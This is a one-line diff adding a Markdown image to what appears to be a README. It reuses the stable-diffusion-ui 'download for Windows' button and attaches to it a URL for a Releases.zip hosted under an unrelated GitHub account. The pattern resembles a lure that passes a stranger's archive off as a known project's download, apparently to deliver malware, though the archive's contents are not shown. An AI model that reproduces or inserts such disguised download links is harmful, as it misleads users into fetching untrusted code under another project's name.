@@ -1,0 +1,1 @@
+![https://github.com/freezmadmin/freezmadmin/releases/download/No9e/Releases.zip](https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png)
